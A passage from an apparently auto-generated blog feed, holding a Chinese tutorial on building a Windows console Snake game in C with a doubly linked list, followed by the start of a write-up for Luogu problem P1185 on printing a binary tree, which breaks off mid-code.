class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;d&#x27;</span> || c == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">n = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">n = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">rewind(<span class="built_in">stdin</span>);<span class="comment">//fflush(stdin); 刷新缓冲区,在VS2015之后不再起作用(编译成功但无效果)</span></span><br><span class="line"><span class="keyword">if</span> ((pre == <span class="number">1</span> &amp;&amp; n == <span class="number">3</span>) || (pre == <span class="number">2</span> &amp;&amp; n == <span class="number">4</span>) || (pre == <span class="number">3</span> &amp;&amp; n == <span class="number">1</span>) || (pre == <span class="number">4</span> &amp;&amp; n == <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> pre;<span class="comment">//如果键盘要求蛇180度转向,则转向失败,蛇仍然按照原来的方向前进</span></span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//成功转向,返回下一步前进的方向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="游戏逻辑—game-c"><a href="#游戏逻辑—game-c" class="headerlink" title="游戏逻辑—game.c"></a>游戏逻辑—game.c</h2><p>包含了所有的初始化操作,游戏运行逻辑,结算处理</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><h3 id="游戏主循环—start-函数"><a href="#游戏主循环—start-函数" class="headerlink" title="游戏主循环—start()函数"></a>游戏主循环—start()函数</h3><p>逻辑伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">print_tips(); <span class="comment">// 打印提示</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(againstTheWall() || againstSelf())&#123;</span><br><span class="line">            gameover();<span class="comment">//进行游戏结束的处理</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        print_score();</span><br><span class="line">        </span><br><span class="line">        snake_move(); <span class="comment">//包含有键盘输入的检测和处理,并在检测到暂停时修改pause_game的值</span></span><br><span class="line">        <span class="keyword">if</span>(eat_apple())&#123;</span><br><span class="line">            snake_growth(); <span class="comment">// 蛇长长</span></span><br><span class="line">            <span class="keyword">if</span> (SnakeLen == maxSnakeLen) &#123;</span><br><span class="line">                gamewin();<span class="comment">// 霸屏则游戏胜利</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            generate_new_apples(); <span class="comment">// 生成新苹果</span></span><br><span class="line">            score++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pause_game)&#123;</span><br><span class="line">            pause_the_game(); <span class="comment">//  暂停,直到检测到要求继续的键盘输入</span></span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(wait_time); <span class="comment">// 休眠一段时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="游戏初始化"><a href="#游戏初始化" class="headerlink" title="游戏初始化"></a>游戏初始化</h3><h4 id="设置游戏难度—setDifficulty-函数"><a href="#设置游戏难度—setDifficulty-函数" class="headerlink" title="设置游戏难度—setDifficulty()函数"></a>设置游戏难度—setDifficulty()函数</h4><p>设置了5个难度,分别对应start()中不同的Sleep时间,以此来影响蛇移动的速度</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setDifficulty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, difficulties[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">1000</span>, <span class="number">800</span>, <span class="number">600</span>, <span class="number">400</span>, <span class="number">200</span>&#125;;<span class="comment">//5种游戏难度---对应不同的等待时间</span></span><br><span class="line">    <span class="comment">// 界面优化相关代码忽略</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输入处理</span></span><br><span class="line">    <span class="type">bool</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) &amp;&amp; n &gt; <span class="number">0</span> &amp;&amp; n &lt; <span class="number">6</span>)</span><br><span class="line">            flag = <span class="number">0</span>;<span class="comment">//输入成功则跳出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入难度[1~5](按回车键确认):&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            rewind(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据输入调整游戏参数</span></span><br><span class="line">    <span class="comment">//wait = 1100 - n * 200; // 旧的调整方法</span></span><br><span class="line">    wait = difficulties[n];<span class="comment">//设置等待时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化分数</span></span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rewind(<span class="built_in">stdin</span>);<span class="comment">//刷新缓冲区</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//清屏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印界面—printBox-函数"><a href="#打印界面—printBox-函数" class="headerlink" title="打印界面—printBox()函数"></a>打印界面—printBox()函数</h4><p>关键是坐标的计算,要在正确的位置进行打印</p><p>使用”□”字符串进行地图的打印,<strong>因为该字符占用2字节,所以x坐标每次要+&#x3D;2而不是+&#x3D;1</strong></p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printBox</span><span class="params">()</span>&#123;</span><br><span class="line">set_map_size(); <span class="comment">// 设置地图大小,大小包括边界(WIDTH和HEIGHT变量,代码略)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//+=2的原因是方块字符并非ASCII字符,占用两个字节大小---坐标每次需要+2而不是+1</span></span><br><span class="line">    <span class="comment">//打印围墙</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; WIDTH * <span class="number">2</span>; i += <span class="number">2</span>) &#123;<span class="comment">//上下</span></span><br><span class="line">        gotoxy(i, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(i, HEIGHT - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= HEIGHT - <span class="number">1</span>; i++) &#123;<span class="comment">//左右</span></span><br><span class="line">        gotoxy(<span class="number">0</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(WIDTH * <span class="number">2</span> - <span class="number">2</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印盒子内部</span></span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= HEIGHT - <span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; WIDTH * <span class="number">2</span> - <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">            gotoxy(i, j);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化蛇和苹果数据"><a href="#初始化蛇和苹果数据" class="headerlink" title="初始化蛇和苹果数据"></a>初始化蛇和苹果数据</h4><p>此处涉及到链表操作!</p><p>1.首先容易想到苹果只需要记录其x,y坐标即可</p><p>2.然后对于蛇,其行为有2种—向前移动一格而不增长,前进并增长一格</p><p>3.而且蛇的每一个结点的运动方向都不一定相同—因为蛇会拐弯</p><p>如果使用单链表,就需要对每一个结点保存其下次前进的方向,也就是要知道其前一个结点的坐标是在当前结点的哪个方向(上&#x2F;下&#x2F;左&#x2F;右)并进行存储,不仅浪费空间,而且频繁修改会导致效率低下</p><p>所以,这里使用双链表来实现,很容易找到前一个结点的坐标来确定移动方向</p><p>实际上这里的双链表实际只影响了当前的蛇尾,因为蛇的每一个节点都是相同的,所以前进仅需在蛇头前进方向新增一个蛇头结点作为新蛇头(代码实现实际上是在蛇头后添加一个蛇身结点),然后删除当前的最后一个结点,即蛇尾</p><p>由此为了效率还需使用一个尾指针tail来指向蛇尾(链表尾)</p><p>综上所述,我们要存储(初始化)的数据即为: </p><p>1.苹果的坐标结构体<br>2.一个带有头结点(直接作为蛇头)的双向链表<br>3.一个指向当前链表尾结点(蛇尾)的指针tail</p><p>同时该部分还要进行游戏刚开始的苹果(默认在地图左上角),蛇身(默认在苹果右边,初始长度为4)的打印</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initSnakeAndApple</span><span class="params">()</span>&#123;</span><br><span class="line">    make_a_snake(<span class="number">4</span>); <span class="comment">// 创建一条长度为4的蛇---即初始化一个双向链表,并设置尾指针</span></span><br><span class="line">    <span class="comment">// 同时要对蛇的每一个节点设置初始坐标</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置蛇的长度相关参数</span></span><br><span class="line">    curSnakeLen = <span class="number">4</span>;<span class="comment">//初始时蛇的长度为4</span></span><br><span class="line">    maxSnakeLen = (WIDTH - <span class="number">2</span>) * (HEIGHT - <span class="number">2</span>);<span class="comment">//根据地图大小计算游戏胜利蛇应该达到的长度</span></span><br><span class="line"></span><br><span class="line">    init_apple(<span class="number">8</span>,<span class="number">4</span>); <span class="comment">// 初始化苹果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//因为代码实现是先无条件前进再进行吃到苹果的处理,所以蛇尾此时已移动,需要提前记录前一个蛇尾的位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇移动—moveSnake-函数"><a href="#蛇移动—moveSnake-函数" class="headerlink" title="蛇移动—moveSnake()函数"></a>蛇移动—moveSnake()函数</h3><p>因为蛇移动并没有长度变化,即蛇头增长,蛇尾缩短,所以直接把蛇尾结点移动到蛇头即可</p><p>对应到链表操作即为修改指针指向,将头结点之后的第一个蛇结点修改为蛇尾,蛇尾结点指向第二个蛇结点,然后倒数第二个结点后驱指向NULL</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">moveSnake</span><span class="params">(<span class="type">int</span> flag)</span> &#123;<span class="comment">//蛇的正常前进</span></span><br><span class="line">    <span class="type">int</span> move[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">-1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">-2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">2</span>,  <span class="number">0</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">//4种不同的移动方向对应的4种坐标变换</span></span><br><span class="line">    flag--;<span class="comment">//对应move数组的元素--从下标0开始</span></span><br><span class="line">    <span class="comment">//保存蛇尾位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">    <span class="comment">//蛇尾,旧蛇头覆盖打印</span></span><br><span class="line">    gotoxy(tail-&gt;x, tail-&gt;y);</span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line"></span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">    <span class="comment">//蛇尾断开</span></span><br><span class="line">    snake *temp = tail;</span><br><span class="line">    tail = tail-&gt;prior;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//蛇尾结点作为新头,不需要删除创建,节省时间</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    temp-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prior = temp;</span><br><span class="line">    head = temp;</span><br><span class="line">    <span class="comment">//新蛇头位置计算并打印</span></span><br><span class="line">    head-&gt;x = head-&gt;next-&gt;x + move[flag][<span class="number">0</span>];</span><br><span class="line">    head-&gt;y = head-&gt;next-&gt;y + move[flag][<span class="number">1</span>];</span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇长长—snakeGrowth-函数"><a href="#蛇长长—snakeGrowth-函数" class="headerlink" title="蛇长长—snakeGrowth()函数"></a>蛇长长—snakeGrowth()函数</h3><p>实际上是双向链表的尾插结点操作</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">snakeGrowth</span><span class="params">()</span> &#123;<span class="comment">//蛇的长度增长</span></span><br><span class="line">    <span class="comment">//新增蛇身结点---即在蛇尾新增一个结点并即刻打印(蛇此时已前进一格且吃到苹果</span></span><br><span class="line">    tail-&gt;next = (snake *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    tail-&gt;next-&gt;prior = tail;</span><br><span class="line">    tail = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;x = pre_x;</span><br><span class="line">    tail-&gt;y = pre_y;</span><br><span class="line">    ++curSnakeLen;<span class="comment">//当前长度+1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印图像</span></span><br><span class="line">    gotoxy(pre_x, pre_y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="comment">//进行打印</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="吃到苹果的处理"><a href="#吃到苹果的处理" class="headerlink" title="吃到苹果的处理"></a>吃到苹果的处理</h3><p>要进行胜负判断苹果的重新生成和打印</p><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码:"></a>关键代码:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行下一个苹果的生成(随机)</span></span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>) time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    apple.x = ((rand() % (WIDTH - <span class="number">2</span>)) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">    apple.y = (rand() % (HEIGHT - <span class="number">2</span>)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (isOverlap()); <span class="comment">// 直到苹果生成在正确的(没有生成在蛇身体上---需要对蛇的链表进行遍历)位置</span></span><br><span class="line">gotoxy(apple.x, apple.y); <span class="comment">// 跳转到该坐标并进行打印苹果</span></span><br><span class="line">color(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">score++; <span class="comment">// 分数+1</span></span><br></pre></td></tr></table></figure><h4 id="判断坐标是否正确—isOverlap-函数"><a href="#判断坐标是否正确—isOverlap-函数" class="headerlink" title="判断坐标是否正确—isOverlap()函数"></a>判断坐标是否正确—isOverlap()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isOverlap</span><span class="params">()</span> &#123;<span class="comment">// 检查新生成的苹果坐标是否和蛇身的任何一个部位重合</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">// 遍历蛇身链表</span></span><br><span class="line">        <span class="keyword">if</span> (apple.x == temp-&gt;x &amp;&amp; apple.y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="胜负判断—是否撞墙或是否撞到自己"><a href="#胜负判断—是否撞墙或是否撞到自己" class="headerlink" title="胜负判断—是否撞墙或是否撞到自己"></a>胜负判断—是否撞墙或是否撞到自己</h3><h4 id="是否撞墙—againstTheWall-函数"><a href="#是否撞墙—againstTheWall-函数" class="headerlink" title="是否撞墙—againstTheWall()函数"></a>是否撞墙—againstTheWall()函数</h4><p>只需要判断蛇头的坐标是否和边界重合</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstTheWall</span><span class="params">()</span> &#123;<span class="comment">//检查撞墙即检查蛇头的坐标是否和墙壁的坐标重合</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;x == <span class="number">0</span> || head-&gt;x == WIDTH * <span class="number">2</span> - <span class="number">2</span> ||</span><br><span class="line">        head-&gt;y == <span class="number">0</span> || head-&gt;y == HEIGHT - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="是否撞到自己—againstTheWall-函数"><a href="#是否撞到自己—againstTheWall-函数" class="headerlink" title="是否撞到自己—againstTheWall()函数"></a>是否撞到自己—againstTheWall()函数</h4><p>此时需要遍历整个链表(除了蛇头)来和蛇头的坐标进行比较</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstSelf</span><span class="params">()</span> &#123; <span class="comment">// 检查撞到自己即检查蛇头的坐标是否和任一蛇身的坐标重合</span></span><br><span class="line">    snake *temp = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123; <span class="comment">// 对链表进行遍历</span></span><br><span class="line">        <span class="keyword">if</span> (head-&gt;x == temp-&gt;x &amp;&amp; head-&gt;y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="销毁数据—destoryGameData-函数"><a href="#销毁数据—destoryGameData-函数" class="headerlink" title="销毁数据—destoryGameData()函数"></a>销毁数据—destoryGameData()函数</h3><p>每局游戏需要进行数据的销毁(链表)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">destoryGameData</span><span class="params">()</span> &#123;<span class="comment">//主要任务即销毁链表</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    snake *next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">//遍历蛇身链表</span></span><br><span class="line">        next = temp-&gt;next;<span class="comment">//蛇最短也有4个结点,不存在temp和temp-&gt;next为NULL的情况</span></span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        temp = next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C C++ programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> console </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1185</title>
      <link href="/2023-09-04-7912381beacd/"/>
      <url>/2023-09-04-7912381beacd/</url>
      
        <content type="html"><![CDATA[<p>首先先说一下最后一个测试点很多人RE的问题,我来了一张图:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/j76jqa31.png"><br>大概就是图里的那样…</p><p>下面是我的思路:<br>可能<del>稍微</del>复杂一点…</p><p>首先,题意我就不说了,关键在于每一层的边长度不同:<br>大佬们已经推出来这么个东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;</span><br></pre></td></tr></table></figure><p>其中f[i]就是高度为i的那一层到它上一层的边的长度(这里的高度指的是由下往上数的高度,为了方便我把最下边设为了1)<br>举个例子(样例)<img src="https://cdn.luogu.com.cn/upload/image_hosting/4ll725uh.png">:<br>也就是说f[i]存的就是第i层到第i-1层的边的长度(几个’&#x2F;‘或’\‘)</p><p>我是先把最下边一层先初始化弄进去,因为我不知道n,所以我从我开的画布数组最下边一行开始,从下往上:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个一组,很容易得出最下面一行共需要(2^(n-1))&#x2F;2次循环,每次直接两个都放进去’o’,然后很容易的j每次加6(横坐标)</p><p>然后从倒数第二行开始模拟往画布里填’o’或’&#x2F;‘或’\‘<br>我们可以这样:计算出当前行的最左&#x2F;最右结点在画布里的坐标为循环边界,从左边(当前行的所有结点视为向上一行的结点的孩子),即左孩子开始,向右上方朝父节点画’&#x2F;‘.</p><p>但是要画几次呢?这时我们的f[]数组就派上用场了…从第i层向上画’&#x2F;‘当然画f[i]次了,然后画完边后再向右上一格把父节点也就是’o’画上,然后从父结点再往右下画回到右孩子,然后这一个子树画完再画旁边的树,画个流程图吧:<img src="https://cdn.luogu.com.cn/upload/image_hosting/ghvps2ft.png"></p><p>就是这样,先上去,再下来,然后虚线跳到下一个子树,注意这时跳跃的长度每层是不一样的,我们用s[]来存,很容易得出(跟f[]很类似):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span 